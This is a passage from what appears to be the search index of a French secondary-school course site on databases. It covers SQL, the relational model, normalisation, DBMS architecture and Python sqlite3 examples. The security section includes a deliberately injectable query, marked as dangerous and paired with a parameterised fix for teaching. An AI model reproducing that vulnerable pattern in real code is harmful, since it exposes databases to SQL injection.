date_retour_effective IS NOT NULL \n  AND date_retour_effective &lt; '2020-01-01';\n\n-- Suppression avec sous-requ\u00eate\nDELETE FROM livres \nWHERE id_auteur IN (\n    SELECT id_auteur \n    FROM auteurs \n    WHERE nationalite = 'Inconnue'\n);\n</code></pre>"},{"location":"terminale/III-Bases_de_donnees/Cours/langage_sql/#vues","title":"Vues","text":"<pre><code>-- Cr\u00e9ation d'une vue\nCREATE VIEW livres_disponibles AS\nSELECT \n    l.isbn,\n    l.titre,\n    a.nom AS auteur_nom,\n    a.prenom AS auteur_prenom,\n    l.genre\nFROM livres l\nINNER JOIN auteurs a ON l.id_auteur = a.id_auteur\nWHERE l.isbn NOT IN (\n    SELECT isbn \n    FROM emprunts \n    WHERE date_retour_effective IS NULL\n);\n\n-- Utilisation de la vue\nSELECT * FROM livres_disponibles WHERE genre = 'Science-fiction';\n</code></pre>"},{"location":"terminale/III-Bases_de_donnees/Cours/langage_sql/#index-pour-loptimisation","title":"Index pour l'optimisation","text":"<pre><code>-- Index simple\nCREATE INDEX idx_livres_genre ON livres(genre);\n\n-- Index compos\u00e9\nCREATE INDEX idx_emprunts_dates ON emprunts(date_emprunt, date_retour_effective);\n\n-- Index unique\nCREATE UNIQUE INDEX idx_lecteurs_email ON lecteurs(email);\n</code></pre>"},{"location":"terminale/III-Bases_de_donnees/Cours/langage_sql/#exemple-pratique-avec-python","title":"Exemple pratique avec Python","text":"<pre><code>import sqlite3\nfrom datetime import datetime, timedelta\n\ndef gestion_bibliotheque():\n    # Connexion \u00e0 la base\n    conn = sqlite3.connect('bibliotheque.db')\n    cursor = conn.cursor()\n\n    # Fonction pour emprunter un livre\n    def emprunter_livre(isbn, id_lecteur):\n        try:\n            # V\u00e9rifier si le livre est disponible\n            cursor.execute(\"\"\"\n                SELECT COUNT(*) FROM emprunts \n                WHERE isbn = ? AND date_retour_effective IS NULL\n            \"\"\", (isbn,))\n\n            if cursor.fetchone()[0] &gt; 0:\n                return \"Livre d\u00e9j\u00e0 emprunt\u00e9\"\n\n            # Cr\u00e9er l'emprunt\n            date_emprunt = datetime.now().date()\n            date_retour = date_emprunt + timedelta(days=21)  # 3 semaines\n\n            cursor.execute(\"\"\"\n                INSERT INTO emprunts (isbn, id_lecteur, date_emprunt, date_retour_prevue)\n                VALUES (?, ?, ?, ?)\n            \"\"\", (isbn, id_lecteur, date_emprunt, date_retour))\n\n            conn.commit()\n            return \"Emprunt cr\u00e9\u00e9 avec succ\u00e8s\"\n\n        except sqlite3.Error as e:\n            conn.rollback()\n            return f\"Erreur : {e}\"\n\n    # Fonction pour retourner un livre\n    def retourner_livre(isbn, id_lecteur):\n        try:\n            cursor.execute(\"\"\"\n                UPDATE emprunts \n                SET date_retour_effective = CURRENT_DATE\n                WHERE isbn = ? AND id_lecteur = ? AND date_retour_effective IS NULL\n            \"\"\", (isbn, id_lecteur))\n\n            if cursor.rowcount &gt; 0:\n                conn.commit()\n                return \"Livre retourn\u00e9 avec succ\u00e8s\"\n            else:\n                return \"Aucun emprunt trouv\u00e9\"\n\n        except sqlite3.Error as e:\n            conn.rollback()\n            return f\"Erreur : {e}\"\n\n    # Fonction pour lister les emprunts en retard\n    def emprunts_en_retard():\n        cursor.execute(\"\"\"\n            SELECT \n                lec.nom,\n                lec.prenom,\n                l.titre,\n                e.date_retour_prevue,\n                (julianday('now') - julianday(e.date_retour_prevue)) AS jours_retard\n            FROM emprunts e\n            JOIN lecteurs lec ON e.id_lecteur = lec.id_lecteur\n            JOIN livres l ON e.isbn = l.isbn\n            WHERE e.date_retour_effective IS NULL \n              AND e.date_retour_prevue &lt; date('now')\n            ORDER BY jours_retard DESC\n        \"\"\")\n\n        return cursor.fetchall()\n\n    return emprunter_livre, retourner_livre, emprunts_en_retard\n</code></pre>"},{"location":"terminale/III-Bases_de_donnees/Cours/langage_sql/#exercices-pratiques","title":"Exercices pratiques","text":""},{"location":"terminale/III-Bases_de_donnees/Cours/langage_sql/#exercice-1-requetes-de-base","title":"Exercice 1 : Requ\u00eates de base","text":"<p>\u00c0 partir de la base de donn\u00e9es biblioth\u00e8que, \u00e9crivez les requ\u00eates SQL pour :</p> <ol> <li>Afficher tous les livres publi\u00e9s apr\u00e8s 2000</li> <li>Compter le nombre de livres par genre</li> <li>Trouver les auteurs fran\u00e7ais</li> <li>Lister les emprunts non rendus</li> </ol>"},{"location":"terminale/III-Bases_de_donnees/Cours/langage_sql/#exercice-2-jointures","title":"Exercice 2 : Jointures","text":"<p>\u00c9crivez les requ\u00eates pour :</p> <ol> <li>Afficher les livres avec le nom complet de leur auteur</li> <li>Lister tous les emprunts avec les d\u00e9tails du livre et du lecteur</li> <li>Trouver les auteurs qui n'ont \u00e9crit aucun livre</li> <li>Afficher les lecteurs qui n'ont jamais emprunt\u00e9 de livre</li> </ol>"},{"location":"terminale/III-Bases_de_donnees/Cours/langage_sql/#exercice-3-fonctions-dagregation","title":"Exercice 3 : Fonctions d'agr\u00e9gation","text":"<ol> <li>Calculer le nombre moyen de pages par genre</li> <li>Trouver l'auteur avec le plus de livres</li> <li>Afficher le nombre d'emprunts par mois</li> <li>Lister les genres avec plus de 3 livres</li> </ol>"},{"location":"terminale/III-Bases_de_donnees/Cours/langage_sql/#exercice-4-sous-requetes","title":"Exercice 4 : Sous-requ\u00eates","text":"<ol> <li>Trouver les livres plus longs que la moyenne</li> <li>Afficher les lecteurs qui ont emprunt\u00e9 plus de 5 livres</li> <li>Lister les livres jamais emprunt\u00e9s</li> <li>Trouver les auteurs dont tous les livres ont \u00e9t\u00e9 emprunt\u00e9s</li> </ol>"},{"location":"terminale/III-Bases_de_donnees/Cours/langage_sql/#bonnes-pratiques","title":"Bonnes pratiques","text":""},{"location":"terminale/III-Bases_de_donnees/Cours/langage_sql/#performance","title":"Performance","text":"<ol> <li>Utiliser des index sur les colonnes fr\u00e9quemment recherch\u00e9es</li> <li>**\u00c9viter SELECT *** : s\u00e9lectionner uniquement les colonnes n\u00e9cessaires</li> <li>Utiliser LIMIT pour limiter les r\u00e9sultats</li> <li>Optimiser les jointures : utiliser les bonnes cl\u00e9s</li> </ol>"},{"location":"terminale/III-Bases_de_donnees/Cours/langage_sql/#securite","title":"S\u00e9curit\u00e9","text":"<ol> <li>Param\u00e8tres li\u00e9s : \u00e9viter les injections SQL</li> <li>Validation des entr\u00e9es : v\u00e9rifier les donn\u00e9es utilisateur</li> <li>Droits minimaux : principe du moindre privil\u00e8ge</li> <li>Audit : tracer les op\u00e9rations sensibles</li> </ol>"},{"location":"terminale/III-Bases_de_donnees/Cours/langage_sql/#lisibilite","title":"Lisibilit\u00e9","text":"<ol> <li>Indentation : structurer les requ\u00eates complexes</li> <li>Alias explicites : noms de colonnes clairs</li> <li>Commentaires : documenter la logique m\u00e9tier</li> <li>Conventions : noms coh\u00e9rents pour tables et colonnes</li> </ol>"},{"location":"terminale/III-Bases_de_donnees/Cours/langage_sql/#conclusion","title":"Conclusion","text":"<p>SQL est un langage puissant et standardis\u00e9 qui permet de manipuler efficacement les donn\u00e9es relationnelles. Sa ma\u00eetrise est essentielle pour : - D\u00e9velopper des applications utilisant des bases de donn\u00e9es - Analyser et extraire des informations de grandes quantit\u00e9s de donn\u00e9es - Optimiser les performances des syst\u00e8mes d'information - Assurer l'int\u00e9grit\u00e9 et la s\u00e9curit\u00e9 des donn\u00e9es</p> <p>La pratique r\u00e9guli\u00e8re et la compr\u00e9hension des concepts sous-jacents sont cl\u00e9s pour devenir efficace en SQL.</p>"},{"location":"terminale/III-Bases_de_donnees/Cours/modele_relationnel/","title":"Le mod\u00e8le relationnel","text":""},{"location":"terminale/III-Bases_de_donnees/Cours/modele_relationnel/#introduction","title":"Introduction","text":"<p>Le mod\u00e8le relationnel est un mod\u00e8le de donn\u00e9es qui organise les donn\u00e9es sous forme de relations (tables). Propos\u00e9 par Edgar F. Codd en 1970, il constitue la base th\u00e9orique des syst\u00e8mes de gestion de bases de donn\u00e9es relationnelles (SGBDR).</p>"},{"location":"terminale/III-Bases_de_donnees/Cours/modele_relationnel/#concepts-fondamentaux","title":"Concepts fondamentaux","text":""},{"location":"terminale/III-Bases_de_donnees/Cours/modele_relationnel/#relation-table","title":"Relation (Table)","text":"<p>Une relation est une structure de donn\u00e9es bidimensionnelle compos\u00e9e de : - Lignes (tuples ou enregistrements) : repr\u00e9sentent les instances d'entit\u00e9s - Colonnes (attributs ou champs) : repr\u00e9sentent les propri\u00e9t\u00e9s des entit\u00e9s</p>"},{"location":"terminale/III-Bases_de_donnees/Cours/modele_relationnel/#attribut","title":"Attribut","text":"<p>Un attribut est une propri\u00e9t\u00e9 ou caract\u00e9ristique d'une entit\u00e9. Chaque attribut poss\u00e8de : - Un nom unique dans la relation - Un domaine : ensemble des valeurs possibles - Un type de donn\u00e9es (entier, cha\u00eene, date, etc.)</p>"},{"location":"terminale/III-Bases_de_donnees/Cours/modele_relationnel/#domaine","title":"Domaine","text":"<p>Le domaine d'un attribut d\u00e9finit l'ensemble des valeurs autoris\u00e9es pour cet attribut.</p> <p>Exemple : - Domaine de l'attribut \"\u00e2ge\" : entiers positifs de 0 \u00e0 150 - Domaine de l'attribut \"sexe\" : {'M', 'F'}</p>"},{"location":"terminale/III-Bases_de_donnees/Cours/modele_relationnel/#tuple-enregistrement","title":"Tuple (Enregistrement)","text":"<p>Un tuple est une ligne de la table qui contient une valeur pour chaque attribut de la relation.</p>"},{"location":"terminale/III-Bases_de_donnees/Cours/modele_relationnel/#schema-relationnel","title":"Sch\u00e9ma relationnel","text":"<p>Le sch\u00e9ma relationnel d\u00e9crit la structure d'une relation en sp\u00e9cifiant : - Le nom de la relation - La liste des attributs avec leurs domaines - Les contraintes d'int\u00e9grit\u00e9</p> <p>Notation : <code>RELATION(attribut1: domaine1, attribut2: domaine2, ...)</code></p> <p>Exemple : <pre><code>ETUDIANT(id_etudiant: entier, nom: cha\u00eene, prenom: cha\u00eene, age: entier, email: cha\u00eene)\n</code></pre></p>"},{"location":"terminale/III-Bases_de_donnees/Cours/modele_relationnel/#les-cles","title":"Les cl\u00e9s","text":""},{"location":"terminale/III-Bases_de_donnees/Cours/modele_relationnel/#cle-primaire","title":"Cl\u00e9 primaire","text":"<p>Une cl\u00e9 primaire est un attribut (ou un ensemble d'attributs) qui : - Identifie de mani\u00e8re unique chaque tuple de la relation - Ne peut pas \u00eatre NULL - Ne peut pas \u00eatre dupliqu\u00e9e</p> <p>Exemple : <pre><code>ETUDIANT(id_etudiant: entier [PK], nom: cha\u00eene, prenom: cha\u00eene, age: entier)\n</code></pre></p>"},{"location":"terminale/III-Bases_de_donnees/Cours/modele_relationnel/#cle-etrangere","title":"Cl\u00e9 \u00e9trang\u00e8re","text":"<p>Une cl\u00e9 \u00e9trang\u00e8re est un attribut (ou un ensemble d'attributs) qui : - Fait r\u00e9f\u00e9rence \u00e0 la cl\u00e9 primaire d'une autre relation - Assure l'int\u00e9grit\u00e9 r\u00e9f\u00e9rentielle - Peut \u00eatre NULL (sauf contrainte sp\u00e9cifique)</p> <p>Exemple : <pre><code>INSCRIPTION(id_inscription: entier [PK], id_etudiant: entier [FK], id_cours: entier [FK], date_inscription: date)\n</code></pre></p>"},{"location":"terminale/III-Bases_de_donnees/Cours/modele_relationnel/#cle-candidate","title":"Cl\u00e9 candidate","text":"<p>Une cl\u00e9 candidate est un attribut (ou ensemble d'attributs) qui pourrait servir de cl\u00e9 primaire.</p>"},{"location":"terminale/III-Bases_de_donnees/Cours/modele_relationnel/#super-cle","title":"Super-cl\u00e9","text":"<p>Une super-cl\u00e9 est un ensemble d'attributs qui contient une cl\u00e9 candidate.</p>"},{"location":"terminale/III-Bases_de_donnees/Cours/modele_relationnel/#contraintes-dintegrite","title":"Contraintes d'int\u00e9grit\u00e9","text":""},{"location":"terminale/III-Bases_de_donnees/Cours/modele_relationnel/#integrite-dentite","title":"Int\u00e9grit\u00e9 d'entit\u00e9","text":"<ul> <li>La cl\u00e9 primaire ne peut jamais \u00eatre NULL</li> <li>Chaque tuple doit \u00eatre unique</li> </ul>"},{"location":"terminale/III-Bases_de_donnees/Cours/modele_relationnel/#integrite-referentielle","title":"Int\u00e9grit\u00e9 r\u00e9f\u00e9rentielle","text":"<ul> <li>Une cl\u00e9 \u00e9trang\u00e8re doit soit \u00eatre NULL, soit r\u00e9f\u00e9rencer une cl\u00e9 primaire existante</li> <li>Pas de \"r\u00e9f\u00e9rences pendantes\"</li> </ul>"},{"location":"terminale/III-Bases_de_donnees/Cours/modele_relationnel/#integrite-de-domaine","title":"Int\u00e9grit\u00e9 de domaine","text":"<ul> <li>Chaque valeur d'attribut doit appartenir au domaine d\u00e9fini</li> <li>Respect des types de donn\u00e9es</li> </ul>"},{"location":"terminale/III-Bases_de_donnees/Cours/modele_relationnel/#exemple-complet","title":"Exemple complet","text":"<p>Consid\u00e9rons une base de donn\u00e9es pour une biblioth\u00e8que :</p>"},{"location":"terminale/III-Bases_de_donnees/Cours/modele_relationnel/#schemas-relationnels","title":"Sch\u00e9mas relationnels","text":"<pre><code>LIVRE(isbn: cha\u00eene [PK], titre: cha\u00eene, auteur: cha\u00eene, annee_publication: entier, nb_pages: entier)\n\nLECTEUR(id_lecteur: entier [PK], nom: cha\u00eene, prenom: cha\u00eene, date_naissance: date, email: cha\u00eene)\n\nEMPRUNT(id_emprunt: entier [PK], isbn: cha\u00eene [FK], id_lecteur: entier [FK], date_emprunt: date, date_retour_prevue: date, date_retour_effective: date)\n</code></pre>"},{"location":"terminale/III-Bases_de_donnees/Cours/modele_relationnel/#tables-avec-donnees","title":"Tables avec donn\u00e9es","text":"<p>Table LIVRE : | isbn | titre | auteur | annee_publication | nb_pages | |------|-------|--------|-------------------|----------| | 978-2-123456-78-9 | 1984 | George Orwell | 1949 | 328 | | 978-2-987654-32-1 | Le Petit Prince | Antoine de Saint-Exup\u00e9ry | 1943 | 96 |</p> <p>Table LECTEUR : | id_lecteur | nom | prenom | date_naissance | email | |------------|-----|--------|----------------|-------| | 1 | Dupont | Jean | 1990-05-15 | jean.dupont@email.com | | 2 | Martin | Marie | 1985-12-03 | marie.martin@email.com |</p> <p>Table EMPRUNT : | id_emprunt | isbn | id_lecteur | date_emprunt | date_retour_prevue | date_retour_effective | |------------|------|------------|--------------|--------------------|-----------------------| | 1 | 978-2-123456-78-9 | 1 | 2024-01-15 | 2024-02-15 | 2024-02-10 | | 2 | 978-2-987654-32-1 | 2 | 2024-01-20 | 2024-02-20 | NULL |</p>"},{"location":"terminale/III-Bases_de_donnees/Cours/modele_relationnel/#avantages-du-modele-relationnel","title":"Avantages du mod\u00e8le relationnel","text":"<ol> <li>Simplicit\u00e9 : Structure tabulaire intuitive</li> <li>Flexibilit\u00e9 : Facilit\u00e9 de modification et d'extension</li> <li>Int\u00e9grit\u00e9 : Contraintes garantissant la coh\u00e9rence des donn\u00e9es</li> <li>Ind\u00e9pendance : S\u00e9paration entre structure logique et physique</li> <li>Standardisation : Langage SQL universel</li> </ol>"},{"location":"terminale/III-Bases_de_donnees/Cours/modele_relationnel/#normalisation","title":"Normalisation","text":"<p>La normalisation est un processus qui vise \u00e0 : - \u00c9liminer la redondance des donn\u00e9es - \u00c9viter les anomalies de mise \u00e0 jour - Optimiser l'organisation des donn\u00e9es</p>"},{"location":"terminale/III-Bases_de_donnees/Cours/modele_relationnel/#premiere-forme-normale-1fn","title":"Premi\u00e8re forme normale (1FN)","text":"<p>Une relation est en 1FN si : - Chaque attribut contient des valeurs atomiques (indivisibles) - Pas de groupes r\u00e9p\u00e9titifs</p>"},{"location":"terminale/III-Bases_de_donnees/Cours/modele_relationnel/#deuxieme-forme-normale-2fn","title":"Deuxi\u00e8me forme normale (2FN)","text":"<p>Une relation est en 2FN si : - Elle est en 1FN - Tous les attributs non-cl\u00e9s d\u00e9pendent enti\u00e8rement de la cl\u00e9 primaire</p>"},{"location":"terminale/III-Bases_de_donnees/Cours/modele_relationnel/#troisieme-forme-normale-3fn","title":"Troisi\u00e8me forme normale (3FN)","text":"<p>Une relation est en 3FN si : - Elle est en 2FN - Aucun attribut non-cl\u00e9 ne d\u00e9pend transitivement de la cl\u00e9 primaire</p>"},{"location":"terminale/III-Bases_de_donnees/Cours/modele_relationnel/#exercices-pratiques","title":"Exercices pratiques","text":""},{"location":"terminale/III-Bases_de_donnees/Cours/modele_relationnel/#exercice-1-identification-des-cles","title":"Exercice 1 : Identification des cl\u00e9s","text":"<p>Soit la relation suivante : <pre><code>VOITURE(immatriculation, marque, modele, couleur, annee, proprietaire_nom, proprietaire_adresse)\n</code></pre></p> <ol> <li>Identifiez la cl\u00e9 primaire</li> <li>Y a-t-il des cl\u00e9s candidates ?</li> <li>Cette relation respecte-t-elle la 3FN ?</li> </ol>"},{"location":"terminale/III-Bases_de_donnees/Cours/modele_relationnel/#exercice-2-conception-dun-schema","title":"Exercice 2 : Conception d'un sch\u00e9ma","text":"<p>Concevez un sch\u00e9ma relationnel pour g\u00e9rer : - Des \u00e9tudiants (nom, pr\u00e9nom, num\u00e9ro \u00e9tudiant, email) - Des cours (code cours, nom, cr\u00e9dits, enseignant) - Des inscriptions (\u00e9tudiant, cours, semestre, note)</p> <ol> <li>D\u00e9finissez les relations avec leurs attributs</li> <li>Identifiez les cl\u00e9s primaires et \u00e9trang\u00e8res</li> <li>V\u00e9rifiez les contraintes d'int\u00e9grit\u00e9</li> </ol>"},{"location":"terminale/III-Bases_de_donnees/Cours/modele_relationnel/#conclusion","title":"Conclusion","text":"<p>Le mod\u00e8le relationnel fournit une base solide pour l'organisation et la gestion des donn\u00e9es. Sa simplicit\u00e9 conceptuelle, combin\u00e9e \u00e0 sa puissance expressive, en fait le standard de facto pour les bases de donn\u00e9es. La compr\u00e9hension de ses principes est essentielle pour concevoir des bases de donn\u00e9es efficaces et maintenir l'int\u00e9grit\u00e9 des donn\u00e9es.</p>"},{"location":"terminale/III-Bases_de_donnees/Cours/sgbd/","title":"Syst\u00e8mes de Gestion de Bases de Donn\u00e9es (SGBD)","text":""},{"location":"terminale/III-Bases_de_donnees/Cours/sgbd/#introduction","title":"Introduction","text":"<p>Un Syst\u00e8me de Gestion de Bases de Donn\u00e9es (SGBD) est un logiciel qui permet de : - Cr\u00e9er et organiser des bases de donn\u00e9es - Stocker, modifier et extraire des informations - G\u00e9rer les acc\u00e8s concurrents et la s\u00e9curit\u00e9 - Assurer l'int\u00e9grit\u00e9 et la coh\u00e9rence des donn\u00e9es</p>"},{"location":"terminale/III-Bases_de_donnees/Cours/sgbd/#fonctionnalites-principales-dun-sgbd","title":"Fonctionnalit\u00e9s principales d'un SGBD","text":""},{"location":"terminale/III-Bases_de_donnees/Cours/sgbd/#1-gestion-des-donnees","title":"1. Gestion des donn\u00e9es","text":"<ul> <li>Stockage physique : Organisation des donn\u00e9es sur les supports de stockage</li> <li>Indexation : Cr\u00e9ation d'index pour acc\u00e9l\u00e9rer les recherches</li> <li>Compression : Optimisation de l'espace de stockage</li> </ul>"},{"location":"terminale/III-Bases_de_donnees/Cours/sgbd/#2-gestion-des-transactions","title":"2. Gestion des transactions","text":"<p>Une transaction est une s\u00e9quence d'op\u00e9rations qui doit \u00eatre ex\u00e9cut\u00e9e de mani\u00e8re atomique.</p> <p>Propri\u00e9t\u00e9s ACID : - Atomicit\u00e9 : Tout ou rien (all or nothing) - Coh\u00e9rence : Respect des contraintes d'int\u00e9grit\u00e9 - Isolation : Les transactions concurrentes n'interf\u00e8rent pas - Durabilit\u00e9 : Les modifications sont permanentes</p> <pre><code># Exemple conceptuel de transaction\ndef transfert_argent(compte_source, compte_destination, montant):\n    # D\u00e9but de transaction\n    try:\n        # Op\u00e9ration 1 : D\u00e9biter le compte source\n        debiter(compte_source, montant)\n\n        # Op\u00e9ration 2 : Cr\u00e9diter le compte destination\n        crediter(compte_destination, montant)\n\n        # Valider la transaction (COMMIT)\n        valider_transaction()\n    except Exception:\n        # Annuler la transaction (ROLLBACK)\n        annuler_transaction()\n</code></pre>"},{"location":"terminale/III-Bases_de_donnees/Cours/sgbd/#3-gestion-de-la-concurrence","title":"3. Gestion de la concurrence","text":"<p>Plusieurs utilisateurs peuvent acc\u00e9der simultan\u00e9ment \u00e0 la base de donn\u00e9es :</p> <ul> <li>Verrous (Locks) : Emp\u00eachent les acc\u00e8s concurrents conflictuels</li> <li>Isolation des transactions : Diff\u00e9rents niveaux d'isolation</li> <li>D\u00e9tection des interblocages : R\u00e9solution des situations de blocage mutuel</li> </ul>"},{"location":"terminale/III-Bases_de_donnees/Cours/sgbd/#4-securite-et-controle-dacces","title":"4. S\u00e9curit\u00e9 et contr\u00f4le d'acc\u00e8s","text":"<ul> <li>Authentification : V\u00e9rification de l'identit\u00e9 des utilisateurs</li> <li>Autorisation : Gestion des droits d'acc\u00e8s (lecture, \u00e9criture, modification)</li> <li>Audit : Tra\u00e7abilit\u00e9 des op\u00e9rations</li> <li>Chiffrement : Protection des donn\u00e9es sensibles</li> </ul>"},{"location":"terminale/III-Bases_de_donnees/Cours/sgbd/#5-sauvegarde-et-recuperation","title":"5. Sauvegarde et r\u00e9cup\u00e9ration","text":"<ul> <li>Sauvegardes r\u00e9guli\u00e8res : Copies de s\u00e9curit\u00e9 des donn\u00e9es</li> <li>Journalisation : Enregistrement des modifications</li> <li>R\u00e9cup\u00e9ration apr\u00e8s panne : Restauration de l'\u00e9tat coh\u00e9rent</li> </ul>"},{"location":"terminale/III-Bases_de_donnees/Cours/sgbd/#architecture-dun-sgbd","title":"Architecture d'un SGBD","text":""},{"location":"terminale/III-Bases_de_donnees/Cours/sgbd/#architecture-a-trois-niveaux-ansisparc","title":"Architecture \u00e0 trois niveaux (ANSI/SPARC)","text":"<pre><code>\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502           Niveau externe            \u2502  \u2190 Vues utilisateurs\n\u2502    (Sch\u00e9mas externes/Vues)          \u2502\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502          Niveau conceptuel          \u2502  \u2190 Sch\u00e9ma logique global\n\u2502      (Sch\u00e9ma conceptuel)            \u2502\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502          Niveau interne             \u2502  \u2190 Organisation physique\n\u2502       (Sch\u00e9ma interne)              \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n</code></pre>"},{"location":"terminale/III-Bases_de_donnees/Cours/sgbd/#niveau-externe","title":"Niveau externe","text":"<ul> <li>Vues utilisateurs : Chaque utilisateur voit une partie de la base</li> <li>Personnalisation : Adaptation aux besoins sp\u00e9cifiques</li> <li>S\u00e9curit\u00e9 : Masquage des donn\u00e9es sensibles</li> </ul>"},{"location":"terminale/III-Bases_de_donnees/Cours/sgbd/#niveau-conceptuel","title":"Niveau conceptuel","text":"<ul> <li>Sch\u00e9ma global : Description compl\u00e8te de la structure logique</li> <li>Contraintes d'int\u00e9grit\u00e9 : R\u00e8gles de coh\u00e9rence</li> <li>Ind\u00e9pendance : S\u00e9paration de la logique et du physique</li> </ul>"},{"location":"terminale/III-Bases_de_donnees/Cours/sgbd/#niveau-interne","title":"Niveau interne","text":"<ul> <li>Organisation physique : Stockage sur disque</li> <li>Optimisation : Index, partitionnement, clustering</li> <li>Performance : Strat\u00e9gies d'acc\u00e8s aux donn\u00e9es</li> </ul>"},{"location":"terminale/III-Bases_de_donnees/Cours/sgbd/#types-de-sgbd","title":"Types de SGBD","text":""},{"location":"terminale/III-Bases_de_donnees/Cours/sgbd/#sgbd-relationnels-sgbdr","title":"SGBD Relationnels (SGBDR)","text":"<p>Caract\u00e9ristiques : - Bas\u00e9s sur le mod\u00e8le relationnel - Utilisation du langage SQL - Respect des propri\u00e9t\u00e9s ACID</p> <p>Exemples : - MySQL : Open source, tr\u00e8s populaire pour le web - PostgreSQL : Open source, tr\u00e8s complet et robuste - Oracle Database : Commercial, haute performance - SQL Server : Microsoft, int\u00e9gration Windows - SQLite : Embarqu\u00e9, fichier unique</p>"},{"location":"terminale/III-Bases_de_donnees/Cours/sgbd/#sgbd-nosql","title":"SGBD NoSQL","text":"<p>Types principaux :</p> <ol> <li>Bases orient\u00e9es documents (MongoDB, CouchDB)</li> <li>Bases cl\u00e9-valeur (Redis, DynamoDB)</li> <li>Bases orient\u00e9es colonnes (Cassandra, HBase)</li> <li>Bases orient\u00e9es graphes (Neo4j, ArangoDB)</li> </ol>"},{"location":"terminale/III-Bases_de_donnees/Cours/sgbd/#exemple-pratique-sqlite","title":"Exemple pratique : SQLite","text":"<p>SQLite est un SGBD embarqu\u00e9 parfait pour l'apprentissage :</p> <pre><code>import sqlite3\n\n# Connexion \u00e0 la base de donn\u00e9es (cr\u00e9ation si inexistante)\nconnexion = sqlite3.connect('bibliotheque.db')\ncurseur = connexion.cursor()\n\n# Cr\u00e9ation d'une table\ncurseur.execute('''\n    CREATE TABLE IF NOT EXISTS livres (\n        id INTEGER PRIMARY KEY AUTOINCREMENT,\n        titre TEXT NOT NULL,\n        auteur TEXT NOT NULL,\n        annee INTEGER,\n        disponible BOOLEAN DEFAULT 1\n    )\n''')\n\n# Insertion de donn\u00e9es\nlivres_data = [\n    ('1984', 'George Orwell', 1949),\n    ('Le Petit Prince', 'Antoine de Saint-Exup\u00e9ry', 1943),\n    ('Dune', 'Frank Herbert', 1965)\n]\n\ncurseur.executemany(\n    'INSERT INTO livres (titre, auteur, annee) VALUES (?, ?, ?)',\n    livres_data\n)\n\n# Validation des modifications\nconnexion.commit()\n\n# Requ\u00eate de s\u00e9lection\ncurseur.execute('SELECT * FROM livres WHERE annee &lt; 1950')\nresultats = curseur.fetchall()\n\nfor livre in resultats:\n    print(f\"ID: {livre[0]}, Titre: {livre[1]}, Auteur: {livre[2]}, Ann\u00e9e: {livre[3]}\")\n\n# Fermeture de la connexion\nconnexion.close()\n</code></pre>"},{"location":"terminale/III-Bases_de_donnees/Cours/sgbd/#optimisation-des-performances","title":"Optimisation des performances","text":""},{"location":"terminale/III-Bases_de_donnees/Cours/sgbd/#index","title":"Index","text":"<p>Les index acc\u00e9l\u00e9rent les recherches :</p> <pre><code>-- Cr\u00e9ation d'un index sur la colonne 'auteur'\nCREATE INDEX idx_auteur ON livres(auteur);\n\n-- Index compos\u00e9 sur plusieurs colonnes\nCREATE INDEX idx_auteur_annee ON livres(auteur, annee);\n</code></pre>"},{"location":"terminale/III-Bases_de_donnees/Cours/sgbd/#requetes-optimisees","title":"Requ\u00eates optimis\u00e9es","text":"<pre><code>-- \u00c9viter SELECT *\nSELECT titre, auteur FROM livres WHERE annee &gt; 1950;\n\n-- Utiliser LIMIT pour limiter les r\u00e9sultats\nSELECT titre FROM livres ORDER BY annee DESC LIMIT 10;\n\n-- Utiliser des jointures efficaces\nSELECT l.titre, e.date_emprunt \nFROM livres l \nINNER JOIN emprunts e ON l.id = e.livre_id \nWHERE e.date_retour IS NULL;\n</code></pre>"},{"location":"terminale/III-Bases_de_donnees/Cours/sgbd/#securite-des-sgbd","title":"S\u00e9curit\u00e9 des SGBD","text":""},{"location":"terminale/III-Bases_de_donnees/Cours/sgbd/#injection-sql","title":"Injection SQL","text":"<p>Probl\u00e8me : <pre><code># DANGEREUX - Vuln\u00e9rable aux injections SQL\nnom_utilisateur = input(\"Nom d'utilisateur: \")\nrequete = f\"SELECT * FROM utilisateurs WHERE nom = '{nom_utilisateur}'\"\ncurseur.execute(requete)\n</code></pre></p> <p>Solution : <pre><code># S\u00c9CURIS\u00c9 - Utilisation de param\u00e8tres\nnom_utilisateur = input(\"Nom d'utilisateur: \")\nrequete = \"SELECT * FROM utilisateurs WHERE nom = ?\"\ncurseur.execute(requete, (nom_utilisateur,))\n</code></pre></p>"},{"location":"terminale/III-Bases_de_donnees/Cours/sgbd/#gestion-des-droits","title":"Gestion des droits","text":"<pre><code>-- Cr\u00e9ation d'un utilisateur\nCREATE USER 'lecteur'@'localhost' IDENTIFIED BY 'mot_de_passe';\n\n-- Attribution de droits sp\u00e9cifiques\nGRANT SELECT ON bibliotheque.livres TO 'lecteur'@'localhost';\n\n-- R\u00e9vocation de droits\nREVOKE INSERT ON bibliotheque.livres FROM 'lecteur'@'localhost';\n</code></pre>"},{"location":"terminale/III-Bases_de_donnees/Cours/sgbd/#exercices-pratiques","title":"Exercices pratiques","text":""},{"location":"terminale/III-Bases_de_donnees/Cours/sgbd/#exercice-1-analyse-darchitecture","title":"Exercice 1 : Analyse d'architecture","text":"<p>Pour chaque niveau de l'architecture ANSI/SPARC, donnez un exemple concret dans le contexte d'une base de donn\u00e9es de gestion scolaire.</p>"},{"location":"terminale/III-Bases_de_donnees/Cours/sgbd/#exercice-2-choix-de-sgbd","title":"Exercice 2 : Choix de SGBD","text":"<p>Pour chaque cas 